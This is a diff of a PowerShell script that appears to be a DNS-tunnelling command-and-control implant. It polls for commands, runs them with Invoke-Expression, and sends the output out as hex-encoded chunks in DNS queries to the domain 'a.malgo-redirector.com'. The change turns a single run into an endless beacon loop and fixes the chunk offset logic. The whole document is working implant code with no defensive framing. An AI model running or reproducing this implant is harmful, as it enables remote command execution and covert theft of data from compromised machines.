@@ -2,12 +2,12 @@ $dnsAddr = "127.0.0.1"
 
 $domain = "a.malgo-redirector.com"
 
-$chunkLength = 50 - $domain.Length
+$chunkLength = 80 - $domain.Length
 if ($chunkLength % 2 -ne 0) {
     $chunkLength -= 1
 }
 
-$sessionId = "9c7d9c57-4fce-420b-a920-1a177802fd79"
+$sessionId = "d8524193-809d-4f36-b65c-9a48ead7258e"
 $projectId = "a6705419-34b2-427a-b515-f193cb079607"
 
 filter thx { ($_.ToCharArray() | % { "{0:X2}" -f [int]$_ }) -join "" }
@@ -85,10 +85,10 @@ function Exfiltrate-Data {
         $data
     )
 
-    $data = $data | Out-String
+    $dataToSend = $data | Out-String
 
     $random = Get-Blob
-    $result_length = $data.Length
+    $result_length = $dataToSend.Length
 
     # send the length of the data
     $queryString = "a.$result_length.$commandId.$random.$domain"
@@ -96,30 +96,37 @@ function Exfiltrate-Data {
     Resolve-DnsName -Name $queryString -Server $dnsAddr -Type A
 
     $offset = 0
-    
-    $data | thx | chunks $chunkLength | dots | % {
+
+    $dataToSend | thx | chunks $chunkLength | dots | % {
         $chunk = $_
         [string]$stringOffset = $offset
         $queryString = "a.$chunk.$stringOffset.$commandId.$random.$domain"
-        Resolve-DnsName -Name $queryString -Server $dnsAddr -Type A
-        $offset += $chunk.Length
+        Resolve-DnsName -Name $queryString -Server $dnsAddr -Type A | Out-Null
+        Write-Host "Sent chunk: $chunk"
+        Write-Host "Offset: $offset"
+        Write-Host "--------------------------------"
+        $offset += $chunkLength/2
     }
 
 }
 
 Register-Session -sessionID $sessionId -projectID $projectId
-$cmd = Get-CommandInfo
-if ($cmd -eq "null") {
-    Write-Host "No command found"
-}
-else {
-    $cmdInfo = $cmd | ConvertFrom-Json
+while($true) {
+    $cmd = Get-CommandInfo
+    if ($cmd -eq "null") {
+        Write-Host "No command found"
+    }
+    else {
+        $cmdInfo = $cmd | ConvertFrom-Json
 
-    $command = Get-CommandDetails -commandID $cmdInfo.command_id
-    Write-Host "Command: $command"
+        $command = Get-CommandDetails -commandID $cmdInfo.command_id
+        Write-Host "Command: $command"
 
-    $response = Invoke-Expression $command | Out-String
-    Write-Host "Response: $response"
+        $response = Invoke-Expression $command | Out-String
+        Write-Host "Response: $response"
 
-    Exfiltrate-Data -commandId $cmdInfo.command_id -data $response
+        Exfiltrate-Data -commandId $cmdInfo.command_id -data $response
+    }
+
+    Start-Sleep -Seconds 5
 }
